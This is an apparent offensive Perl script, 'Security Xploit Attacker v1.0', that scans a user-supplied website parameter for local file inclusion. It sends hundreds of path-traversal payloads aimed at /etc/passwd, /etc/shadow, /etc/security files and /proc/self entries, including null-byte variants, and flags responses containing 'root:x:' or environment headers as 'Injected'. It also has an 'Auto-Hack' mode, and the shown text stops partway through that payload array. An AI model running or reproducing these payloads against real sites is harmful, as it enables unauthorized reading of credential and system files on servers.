#!/usr/bin/perl
use if $^O eq "MSWin32", Win32::Console::ANSI;
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);

main:;
$ag = LWP::UserAgent->new();
$ag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ag->timeout(10);



 print color('blue');
 system("title Local File Inclusion");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
my $datetime    = localtime;
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
$logo="
             	
            
                      .                                                      .
                    .n                   .                 .                  n.
              .   .dP                  dP                   9b                 9b.    .
             4    qXb         .       dX                     Xb       .        dXp     t
            dX.    9Xb      .dXb    __       [Ph.Hitachi]      __    dXb.     dXP     .Xb
            9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
             9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
              `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
                `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
                    ~~~~~~~       9X.    0     .db|db.     0    .XP       ~~~~~~~
                                   8b.     .dbodP'89b.odb.     .d8
                                  ,dXXXXXXXXXXXb  8  dXXXXXXXXXXXb.
                                 dXXXXXXXXXXXP'   8   9XXXXXXXXXXXb
                                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                9XXbXXXXXb.dX     |     Xb.dXXXXXdXXP
                                         9XXXXXX(___)XXXXXXP      
                                        xXXXXX X.'v'.X XXXXXx
                                            XXXbb   ddXXX
                                           x.X         X.x
                                          b'             'd     
                               Copyright (c) 2018. All right reseved
";
print $logo;
print "\n\n";
sleep (1);
print color('reset');
print "                      	           ";
print colored("[+]",'green on_blue');
print colored("Security Xploit Attacker v1.0",'red on_cyan');
print colored("[+]\n",'green on_blue');
print "              	                 ";
print colored("[+]",'green on_blue');
print colored ("Start At $datetime",'white on_cyan'),"";
print colored("[+]\n",'green on_blue');
print "              	                         ";
print colored("Local File Inclusion",'black on_white');

print "\n\n";
menu:;
print colored("____________________________\n",'cyan');
print "                            \n";
print colored("    Available Injections    \n",'red');
print colored("____________________________\n",'cyan');
print color("green" ), "[";print color("white"),"01";print color("green"),"]";print colored("/etc/passwd/  \n",'blue');
print color("green" ), "[";print color("white"),"02";print color("green"),"]";print colored("/proc/self/   \n",'green');
print color("green" ), "[";print color("white"),"03";print color("green"),"]";print color("red"),"php://input";print color("white"),"        |>Not available\n";
print color("green" ), "[";print color("white"),"04";print color("green"),"]";print color("yellow"),"/proc/self/fd";print color("white"),"      |>Not available\n";
print color("green" ), "[";print color("white"),"05";print color("green"),"]";print color("blue"),"access_log";print color("white"),"         |>Not available\n";
print color("green" ), "[";print color("white"),"06";print color("green"),"]";print color("green"),"phpinfo";print color("white"),"            |>Not available\n";
print color("green" ), "[";print color("white"),"07";print color("green"),"]";print color("red"),"data://";print color("white"),"            |>Not available\n";
print color("green" ), "[";print color("white"),"08";print color("green"),"]";print color("yellow"),"expect://";print color("white"),"          |>Not available\n";
print color("green" ), "[";print color("white"),"09";print color("green"),"]";print color("blue"),"Auto-Hack\n";
print color("green" ), "[";print color("white"),"00";print color("green"),"]";print color("green"),"Back\n";
print colored("____________________________\n",'cyan');
print color("bold white"),"Choose Number : ";
$item = <STDIN>;
chomp($item);
if ($item  eq '1'){
        goto etc_pass;
        }
if ($item eq '2'){
        goto proc_self;
        }
if ($item eq '3'){
        goto Comming_soon;
		}
if ($item  eq '4'){
        goto Comming_soon;
        }
if ($item  eq '5'){
        goto Comming_soon;
        }
if ($item  eq '6'){
        goto Comming_soon;
        }
if ($item  eq '7'){
        goto Comming_soon;
        }		
if ($item  eq '8'){
        goto Comming_soon;
        }
if ($item eq '9'){
         goto auto;
        }
if ($item  eq '0'){
        system ("xploit.pl");
        }				
        else {
                print"\n\n";
                print "\t\tUnknow Command\n";
                goto menu;
        };


etc_pass:;
    print ("\n\n");
    print ("\t\t\t        Scan etc/passwd \n\n");
    print "\t\t\t      Insert Target with parameter\n";
	print colored("\t\t\t ex: http://www.site.com/index.php?page=\n",'red');
    print ("Target :");
    $host=<STDIN>;
    chomp($host);
    if($host !~ /http:\/\//) { $host = "http://$host"; };
print "\n\n";
print "\t\tStart Scanning /etc/ Section ....\n";
print "\n\n";
@lfi = ('../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../etc/passwd',
'....//etc/passwd',
'....//....//etc/passwd',
'....//....//....//etc/passwd',
'....//....//....//....//etc/passwd',
'....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//....//etc/passwd',
'../../etc/passwd%00',
'../../../etc/passwd%00',
'../../../../etc/passwd%00',
'../../../../../etc/passwd%00',
'../../../../../../etc/passwd%00',
'../../../../../../../etc/passwd%00',
'../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../etc/passwd%00',
'....//etc/passwd%00',
'....//....//etc/passwd%00',
'....//....//....//etc/passwd%00',
'....//....//....//....//etc/passwd%00',
'....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//....//etc/passwd%00',
'../etc/shadow',
'../../etc/shadow',
'../../../etc/shadow',
'../../../../etc/shadow',
'../../../../../etc/shadow',
'../../../../../../etc/shadow',
'../../../../../../../etc/shadow',
'../../../../../../../../etc/shadow',
'../../../../../../../../../etc/shadow',
'../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../../etc/shadow',
'../etc/shadow%00',
'../../etc/shadow%00',
'../../../etc/shadow%00',
'../../../../etc/shadow%00',
'../../../../../etc/shadow%00',
'../../../../../../etc/shadow%00',
'../../../../../../../etc/shadow%00',
'../../../../../../../../etc/shadow%00',
'../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../../etc/shadow%00',
'../etc/group',
'../../etc/group',
'../../../etc/group',
'../../../../etc/group',
'../../../../../etc/group',
'../../../../../../etc/group',
'../../../../../../../etc/group',
'../../../../../../../../etc/group',
'../../../../../../../../../etc/group',
'../../../../../../../../../../etc/group',
'../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../../etc/group',
'../etc/group%00',
'../../etc/group%00',
'../../../etc/group%00',
'../../../../etc/group%00',
'../../../../../etc/group%00',
'../../../../../../etc/group%00',
'../../../../../../../etc/group%00',
'../../../../../../../../etc/group%00',
'../../../../../../../../../etc/group%00',
'../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../../etc/group%00',
'../etc/security/group',
'../../etc/security/group',
'../../../etc/security/group',
'../../../../etc/security/group',
'../../../../../etc/security/group',
'../../../../../../etc/security/group',
'../../../../../../../etc/security/group',
'../../../../../../../../etc/security/group',
'../../../../../../../../../etc/security/group',
'../../../../../../../../../../etc/security/group',
'../../../../../../../../../../../etc/security/group',
'../etc/security/group%00',
'../../etc/security/group%00',
'../../../etc/security/group%00',
'../../../../etc/security/group%00',
'../../../../../etc/security/group%00',
'../../../../../../etc/security/group%00',
'../../../../../../../etc/security/group%00',
'../../../../../../../../etc/security/group%00',
'../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../../etc/security/group%00',
'../etc/security/passwd',
'../../etc/security/passwd',
'../../../etc/security/passwd',
'../../../../etc/security/passwd',
'../../../../../etc/security/passwd',
'../../../../../../etc/security/passwd',
'../../../../../../../etc/security/passwd',
'../../../../../../../../etc/security/passwd',
'../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../../etc/security/passwd',
'../etc/security/passwd%00',
'../../etc/security/passwd%00',
'../../../etc/security/passwd%00',
'../../../../etc/security/passwd%00',
'../../../../../etc/security/passwd%00',
'../../../../../../etc/security/passwd%00',
'../../../../../../../etc/security/passwd%00',
'../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../../etc/security/passwd%00',
'../etc/security/user',
'../../etc/security/user',
'../../../etc/security/user',
'../../../../etc/security/user',
'../../../../../etc/security/user',
'../../../../../../etc/security/user',
'../../../../../../../etc/security/user',
'../../../../../../../../etc/security/user',
'../../../../../../../../../etc/security/user',
'../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../../etc/security/user',
'../etc/security/user%00',
'../../etc/security/user%00',
'../../../etc/security/user%00',
'../../../../etc/security/user%00',
'../../../../../etc/security/user%00',
'../../../../../../etc/security/user%00',
'../../../../../../../etc/security/user%00',
'../../../../../../../../etc/security/user%00',
'../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../../etc/security/user%00');


foreach $scan(@lfi){

$url = $host.$scan;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();
$vuln = "Injected";
$not = "Not Injected";
$response = $useragent->request($request);
if ($response->is_success && $response->content =~ /root:x:/) { 
print "$scan.........................";
print colored"[$vuln]\n",'green';
}
else{
print "$scan.........................";
print colored"[$not]\n",'red';
}
}
proc_self:;
    print ("\n\n");
    print ("\t\t\t    Scan proc/self/environ \n");
    print "\t\t\t  Insert Target with parameter\n";
	print colored("\t\t     ex: http://www.site.com/index.php?page=\n",'red');
    print ("Target :");
    $host=<STDIN>;
    chomp($host);
    if($host !~ /http:\/\//) { $host = "http://$host"; };

print "\n\n";
print "\t\t*-*-*-*-*-* Start Scanning Environ  *-*-*-*-*-*\n";
print "\n\n";

@proc_self= ('../proc/self/environ',
'../../proc/self/environ',
'../../../proc/self/environ',
'../../../../proc/self/environ',
'../../../../../proc/self/environ',
'../../../../../../proc/self/environ',
'../../../../../../../proc/self/environ',
'../../../../../../../../proc/self/environ',
'../../../../../../../../../proc/self/environ',
'../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../proc/self/environ',
'../proc/self/environ%00',
'../../proc/self/environ%00',
'../../../proc/self/environ%00',
'../../../../proc/self/environ%00',
'../../../../../proc/self/environ%00',
'../../../../../../proc/self/environ%00',
'../../../../../../../proc/self/environ%00',
'../../../../../../../../proc/self/environ%00',
'../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../proc/self/environ%00',
'/proc/self/cmdline',
'../proc/self/cmdline',
'../../proc/self/cmdline',
'../../../proc/self/cmdline',
'../../../../proc/self/cmdline',
'../../../../../proc/self/cmdline',
'../../../../../../proc/self/cmdline',
',../../../../../../../proc/self/cmdline',
',../../../../../../../../proc/self/cmdline',
',../../../../../../../../../proc/self/cmdline',
',../../../../../../../../../../proc/self/cmdline',
',../../../../../../../../../../../proc/self/cmdline',
',../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../../../../../proc/self/cmdline',
'/proc/self/cmdline%00',
'../proc/self/cmdline%00',
'../../proc/self/cmdline%00',
'../../../proc/self/cmdline%00',
'../../../../proc/self/cmdline%00',
'../../../../../proc/self/cmdline%00',
'../../../../../../proc/self/cmdline%00',
'../../../../../../../proc/self/cmdline%00',
'../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../../../../../proc/self/cmdline%00',
'/proc/self/stat',
'../proc/self/stat',
'../../proc/self/stat',
'../../../proc/self/stat',
'../../../../proc/self/stat',
'../../../../../proc/self/stat',
'../../../../../../proc/self/stat',
'../../../../../../../proc/self/stat',
'../../../../../../../../proc/self/stat',
'../../../../../../../../../proc/self/stat',
'../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../../../../../../proc/self/stat',
'/proc/self/stat%00',
'../proc/self/stat%00',
'../../proc/self/stat%00',
'../../../proc/self/stat%00',
'../../../../proc/self/stat%00',
'../../../../../proc/self/stat%00',
'../../../../../../proc/self/stat%00',
'../../../../../../../proc/self/stat%00',
'../../../../../../../../proc/self/stat%00',
'../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../../../../../../proc/self/stat%00',
'/proc/self/status',
'../proc/self/status',
'../../proc/self/status',
'../../../proc/self/status',
'../../../../proc/self/status',
'../../../../../proc/self/status',
'../../../../../../proc/self/status',
'../../../../../../../proc/self/status',
'../../../../../../../../proc/self/status',
'../../../../../../../../../proc/self/status',
'../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../../../../../../proc/self/status',
'/proc/self/status%00',
'../proc/self/status%00',
'../../proc/self/status%00',
'../../../proc/self/status%00',
'../../../../proc/self/status%00',
'../../../../../proc/self/status%00',
'../../../../../../proc/self/status%00',
'../../../../../../../proc/self/status%00',
'../../../../../../../../proc/self/status%00',
'../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../../../../../proc/self/status%00',
'../../../../../../../../../../../../../../../../../../proc/self/status%00');

foreach $scan(@proc_self){

$url = $host.$scan;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();
$vuln = "Injected";
$not = "Not Injected";
$response = $useragent->request($request);
if ($response->is_success && $response->content =~ /HTTP_ACCEPT/ && $response->content =~ /HTTP_HOST/) { 
print "$scan.........................";
print colored"[$vuln]\n",'green';
}
else{
print "$scan.........................";
print colored"[$not]\n",'red';
}
}
auto:;
    print ("\n\n");
    print ("\t\t\t     Welcome To Auto-Hack \n");
    print "\t\t\t Insert Target with parameter\n";
	print colored("\t\t  ex: http://www.site.com/index.php?page=\n",'red');
    print ("Target :");
    $host=<STDIN>;
    chomp($host);
    if($host !~ /http:\/\//) { $host = "http://$host"; };
print "\n\n";
print "\t\tStart Scanning /etc/ Section ....\n";
print "\n\n";
@auto = ('../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../etc/passwd',
'....//etc/passwd',
'....//....//etc/passwd',
'....//....//....//etc/passwd',
'....//....//....//....//etc/passwd',
'....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//....//etc/passwd',
'../../etc/passwd%00',
'../../../etc/passwd%00',
'../../../../etc/passwd%00',
'../../../../../etc/passwd%00',
'../../../../../../etc/passwd%00',
'../../../../../../../etc/passwd%00',
'../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../etc/passwd%00',
'....//etc/passwd%00',
'....//....//etc/passwd%00',
'....//....//....//etc/passwd%00',
'....//....//....//....//etc/passwd%00',
'....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//....//etc/passwd%00',
'../etc/shadow',
'../../etc/shadow',
'../../../etc/shadow',
'../../../../etc/shadow',
'../../../../../etc/shadow',
'../../../../../../etc/shadow',
'../../../../../../../etc/shadow',
'../../../../../../../../etc/shadow',
'../../../../../../../../../etc/shadow',
'../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../../etc/shadow',
'../etc/shadow%00',
'../../etc/shadow%00',
'../../../etc/shadow%00',
'../../../../etc/shadow%00',
'../../../../../etc/shadow%00',
'../../../../../../etc/shadow%00',
'../../../../../../../etc/shadow%00',
'../../../../../../../../etc/shadow%00',
'../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../../etc/shadow%00',
'../etc/group',
'../../etc/group',
'../../../etc/group',
'../../../../etc/group',
'../../../../../etc/group',
'../../../../../../etc/group',
'../../../../../../../etc/group',
'../../../../../../../../etc/group',
'../../../../../../../../../etc/group',
'../../../../../../../../../../etc/group',
'../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../../etc/group',
'../etc/group%00',
'../../etc/group%00',
'../../../etc/group%00',
'../../../../etc/group%00',
'../../../../../etc/group%00',
'../../../../../../etc/group%00',
'../../../../../../../etc/group%00',
'../../../../../../../../etc/group%00',
'../../../../../../../../../etc/group%00',
'../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../../etc/group%00',
'../etc/security/group',
'../../etc/security/group',
'../../../etc/security/group',
'../../../../etc/security/group',
'../../../../../etc/security/group',
'../../../../../../etc/security/group',
'../../../../../../../etc/security/group',
'../../../../../../../../etc/security/group',
'../../../../../../../../../etc/security/group',
'../../../../../../../../../../etc/security/group',
'../../../../../../../../../../../etc/security/group',
'../etc/security/group%00',
'../../etc/security/group%00',
'../../../etc/security/group%00',
'../../../../etc/security/group%00',
'../../../../../etc/security/group%00',
'../../../../../../etc/security/group%00',
'../../../../../../../etc/security/group%00',
'../../../../../../../../etc/security/group%00',
'../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../../etc/security/group%00',
'../etc/security/passwd',
'../../etc/security/passwd',
'../../../etc/security/passwd',
'../../../../etc/security/passwd',
'../../../../../etc/security/passwd',
'../../../../../../etc/security/passwd',
'../../../../../../../etc/security/passwd',
'../../../../../../../../etc/security/passwd',
'../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../../etc/security/passwd',
'../etc/security/passwd%00',
'../../etc/security/passwd%00',
'../../../etc/security/passwd%00',
'../../../../etc/security/passwd%00',
'../../../../../etc/security/passwd%00',
'../../../../../../etc/security/passwd%00',
'../../../../../../../etc/security/passwd%00',
'../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../../etc/security/passwd%00',
'../etc/security/user',
'../../etc/security/user',
'../../../etc/security/user',
'../../../../etc/security/user',
'../../../../../etc/security/user',
'../../../../../../etc/security/user',
'../../../../../../../etc/security/user',
'../../../../../../../../etc/security/user',
'../../../../../../../../../etc/security/user',
'../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../../etc/security/user',
'../etc/security/user%00',
'../../etc/security/user%00',
'../../../etc/security/user%00',
'../../../../etc/security/user%00',
'../../../../../etc/security/user%00',
'../../../../../../etc/security/user%00',
'../../../../../../../etc/security/user%00',
'../../../../../../../../etc/security/user%00',
'../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../../etc/security/user%00',
'../proc/self/environ',
'../../proc/self/environ',
'../../../proc/self/environ',
'../../../../proc/self/environ',
'../../../../../proc/self/environ',
'../../../../../../proc/self/environ',
'../../../../../../../proc/self/environ',
'../../../../../../../../proc/self/environ',
'../../../../../../../../../proc/self/environ',
'../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../proc/self/environ',
'../proc/self/environ%00',
'../../proc/self/environ%00',
'../../../proc/self/environ%00',
'../../../../proc/self/environ%00',
'../../../../../proc/self/environ%00',
'../../../../../../proc/self/environ%00',
'../../../../../../../proc/self/environ%00',
'../../../../../../../../proc/self/environ%00',
'../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../proc/self/environ%00',
'/proc/self/cmdline',
'../proc/self/cmdline',
'../../proc/self/cmdline',
'../../../proc/self/cmdline',
'../../../../proc/self/cmdline',
'../../../../../proc/self/cmdline',
'../../../../../../proc/self/cmdline',
',../../../../../../../proc/self/cmdline',
',../../../../../../../../proc/self/cmdline',
',../../../../../../../../../proc/self/cmdline',
',../../../../../../../../../../proc/self/cmdline',
',../../../../../../../../../../../proc/self/cmdline',
',../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../../../../proc/self/cmdline',
'../../../../../../../../../../../../../../../../../../proc/self/cmdline',
'/proc/self/cmdline%00',
'../proc/self/cmdline%00',
'../../proc/self/cmdline%00',
'../../../proc/self/cmdline%00',
'../../../../proc/self/cmdline%00',
'../../../../../proc/self/cmdline%00',
'../../../../../../proc/self/cmdline%00',
'../../../../../../../proc/self/cmdline%00',
'../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../../../../proc/self/cmdline%00',
'../../../../../../../../../../../../../../../../../../proc/self/cmdline%00',
'/proc/self/stat',
'../proc/self/stat',
'../../proc/self/stat',
'../../../proc/self/stat',
'../../../../proc/self/stat',
'../../../../../proc/self/stat',
'../../../../../../proc/self/stat',
'../../../../../../../proc/self/stat',
'../../../../../../../../proc/self/stat',
'../../../../../../../../../proc/self/stat',
'../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../../../../../proc/self/stat',
'../../../../../../../../../../../../../../../../../../proc/self/stat',
'/proc/self/stat%00',
'../proc/self/stat%00',
'../../proc/self/stat%00',
'../../../proc/self/stat%00',
'../../../../proc/self/stat%00',
'../../../../../proc/self/stat%00',
'../../../../../../proc/self/stat%00',
'../../../../../../../proc/self/stat%00',
'../../../../../../../../proc/self/stat%00',
'../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../../../../../proc/self/stat%00',
'../../../../../../../../../../../../../../../../../../proc/self/stat%00',
'/proc/self/status',
'../proc/self/status',
'../../proc/self/status',
'../../../proc/self/status',
'../../../../proc/self/status',
'../../../../../proc/self/status',
'../../../../../../proc/self/status',
'../../../../../../../proc/self/status',
'../../../../../../../../proc/self/status',
'../../../../../../../../../proc/self/status',
'../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../../../../../proc/self/status',
'../../../../../../../../../../../../../../../../../../proc/self/status',
'/proc/self/status%00',
'../proc/self/status%00',
'../../proc/self/status%00',
'../../../proc/self/status%00',
'../../../../proc/self/status%00',
'../../../../../proc/self/status%00',
'../../../../../../proc/self/status%00',
'../../../../../../../proc/self/status%00',
'../../../../../../../../proc/self/status%00',
